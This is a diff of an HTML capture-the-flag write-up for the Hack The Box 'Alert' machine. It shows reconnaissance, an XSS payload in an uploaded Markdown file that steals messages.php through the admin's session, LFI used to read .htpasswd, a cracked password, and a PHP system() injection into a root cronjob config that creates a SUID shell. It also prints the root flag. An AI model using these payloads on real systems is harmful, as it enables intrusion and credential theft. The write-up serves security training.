@@ -1,179 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alert - Writeup</title>
-    <style>
-        /* Global Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<div class="writeup-content">
+    <div style="text-align: center;">
+        <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert Banner" style="border:none; width: 300px; margin-bottom: 20px;">
+        <h3 style="color: #3fb950;">Level: Easy</h3>
+    </div>
 
-        body {
-            background-color: #0d1117;
-            color: #c9d1d9;
-            font-family: 'Courier New', monospace;
-            line-height: 1.6;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 20px;
-        }
+    <h3 class="step-header">1. Reconnaissance</h3>
+    <p>I started with port enumeration:</p>
+    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
+    
+    <ul>
+        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+        <li><strong>-sS</strong>: SYN stealth scan.</li>
+        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+    </ul>
 
-        /* Titles */
-        h1, h2, h3 { color: #79c0ff; text-align: center; margin-bottom: 10px; }
-        .step-header {
-            color: #ff7b72;
-            border-bottom: 1px solid #30363d;
-            margin: 40px 0 20px 0;
-            padding-bottom: 5px;
-            font-size: 1.4em;
-        }
+    <p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
+    <div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>
 
-        /* Layout Container */
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            gap: 40px;
-            max-width: 1100px;
-            width: 100%;
-            margin-top: 30px;
-        }
+    <p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code> and performed vhost enumeration:</p>
+    <div class="terminal-box">ffuf -w subdomains.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
+    <p>Found a <code>statistics</code> subdomain that requires authentication.</p>
 
-        .main-content {
-            background-color: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            padding: 40px;
-            flex: 1;
-            max-width: 800px;
-        }
+    <h3 class="step-header">2. Web Exploitation (XSS to LFI)</h3>
+    <p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files. I discovered that it is vulnerable to XSS. I crafted a payload to leak <code>messages.php</code> via the administrator's session:</p>
 
-        /* Sidebar & Sticky Nav */
-        .sidebar {
-            flex: 0 0 150px;
-            align-self: stretch;
-        }
-
-        .sticky-nav {
-            position: sticky;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .nav-btn {
-            background-color: #21262d;
-            border: 1px solid #30363d;
-            color: #58a6ff;
-            padding: 12px;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 6px;
-            font-weight: bold;
-            transition: all 0.2s;
-        }
-
-        .nav-btn:hover {
-            background-color: #30363d;
-            border-color: #8b949e;
-            color: #79c0ff;
-        }
-
-        /* Terminal & Copy Button Logic */
-        .terminal-wrapper {
-            position: relative;
-            margin: 20px 0;
-        }
-
-        .terminal-box {
-            background-color: #000000;
-            color: #39ff14;
-            padding: 15px;
-            padding-right: 65px; 
-            border-radius: 6px;
-            border: 1px solid #30363d;
-            font-size: 0.9em;
-            overflow-x: auto;
-            white-space: pre-wrap;
-        }
-
-        .copy-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: rgba(121, 192, 255, 0.1);
-            border: 1px solid #30363d;
-            color: #79c0ff;
-            padding: 5px 10px;
-            font-size: 11px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .copy-btn:hover {
-            background: #79c0ff;
-            color: #0d1117;
-        }
-
-        /* Flags & Lists */
-        fieldset {
-            border: 1px solid #3fb950;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px 0;
-            background: rgba(63, 185, 80, 0.05);
-        }
-        legend { color: #3fb950; padding: 0 10px; font-weight: bold; }
-
-        ul { margin-left: 25px; margin-bottom: 15px; }
-        li { margin-bottom: 8px; color: #8b949e; }
-
-        img {
-            max-width: 100%;
-            border-radius: 6px;
-            border: 1px solid #30363d;
-            margin: 20px 0;
-        }
-    </style>
-</head>
-<body>
-
-    <h1>Hack The Box</h1>
-    <h2>Alert</h2>
-    <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert Banner" style="border:none; width: 300px;">
-    <h3>Level: Easy</h3>
-
-    <div class="container">
-        <div class="main-content">
-            <h3 class="step-header">1. Reconnaissance</h3>
-            <p>I started with port enumeration:</p>
-            <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
-            
-            <ul>
-                <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
-                <li><strong>-sS</strong>: SYN stealth scan.</li>
-                <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
-            </ul>
-
-            <p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
-            <div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>
-
-            <p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code> and performed vhost enumeration:</p>
-            <div class="terminal-box">ffuf -w subdomains.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
-            <p>Found a <code>statistics</code> subdomain that requires authentication.</p>
-
-            <h3 class="step-header">2. Web Exploitation (XSS to LFI)</h3>
-            <p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files. I discovered that it is vulnerable to XSS. I crafted a payload to leak <code>messages.php</code> via the administrator's session:</p>
-
-            <div class="terminal-box">&lt;script&gt;
+    <div class="terminal-box">&lt;script&gt;
 fetch('http://alert.htb/messages.php')
 .then(resp => resp.text())
 .then(body => {
@@ -181,72 +32,36 @@ fetch('http://alert.htb/messages.php')
 })
 &lt;/script&gt;</div>
 
-            
+    <p>I sent the share link to the admin via the "Contact Us" form. The admin's visit triggered the script, exfiltrating the base64 content of <code>messages.php</code> to my listener.</p>
 
-            <p>I sent the share link to the admin via the "Contact Us" form. The admin's visit triggered the script, exfiltrating the base64 content of <code>messages.php</code> to my listener.</p>
+    <p>Decoding the data revealed a hidden file path:</p>
+    <div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>
 
-            <p>Decoding the data revealed a hidden file path:</p>
-            <div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>
+    <h3 class="step-header">3. Initial Access</h3>
+    <p>Using the LFI vulnerability, I read the Apache configuration and found the <code>.htpasswd</code> file for the statistics subdomain:</p>
+    <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
 
-            <h3 class="step-header">3. Initial Access</h3>
-            <p>Using the LFI vulnerability, I read the Apache configuration and found the <code>.htpasswd</code> file for the statistics subdomain:</p>
-            <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
+    <p>Cracked the hash using <code>hashcat</code>:</p>
+    <fieldset class="cred-box">
+        <legend>Credentials</legend>
+        <code>albert:manchesterunited</code>
+    </fieldset>
 
-            <p>Cracked the hash using <code>hashcat</code>:</p>
-            <fieldset>
-                <legend>Credentials</legend>
-                <code>albert:manchesterunited</code>
-            </fieldset>
+    <h3 class="step-header">4. Privilege Escalation</h3>
+    <p>Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
+    <div class="terminal-box">find / -group management 2>/dev/null</div>
 
-            <h3 class="step-header">4. Privilege Escalation</h3>
-            <p>Checking group memberships:</p>
-            <div class="terminal-box">id</div>
-            <p>Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
-            <div class="terminal-box">find / -group management 2>/dev/null</div>
-
-            <p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
-            <div class="terminal-box">&lt;?php 
+    <p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
+    <div class="terminal-box">&lt;?php 
 define('PATH', '/opt/website-monitor'); 
 system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); 
 ?&gt;</div>
 
-            <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
-            <div class="terminal-box">/tmp/damn -p</div>
+    <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
+    <div class="terminal-box">/tmp/damn -p</div>
 
-            <fieldset>
-                <legend>Root Flag</legend>
-                <code>65383dc809d3cec5c567740343688722</code>
-            </fieldset>
-        </div>
-
-        <aside class="sidebar">
-            <nav class="sticky-nav">
-                <a href="/index.html" class="nav-btn">Home</a>
-                <a href="/machines.html" class="nav-btn">Machines</a>
-            </nav>
-        </aside>
-    </div>
-
-    <script>
-        document.querySelectorAll('.terminal-box').forEach((box) => {
-            const wrapper = document.createElement('div');
-            wrapper.className = 'terminal-wrapper';
-            box.parentNode.insertBefore(wrapper, box);
-            wrapper.appendChild(box);
-
-            const btn = document.createElement('button');
-            btn.className = 'copy-btn';
-            btn.innerText = 'Copy';
-
-            btn.addEventListener('click', () => {
-                const text = box.innerText;
-                navigator.clipboard.writeText(text).then(() => {
-                    btn.innerText = 'Copied!';
-                    setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
-                });
-            });
-            wrapper.appendChild(btn);
-        });
-    </script>
-</body>
-</html>
+    <fieldset class="root-box">
+        <legend>Root Flag</legend>
+        <code>65383dc809d3cec5c567740343688722</code>
+    </fieldset>
+</div>
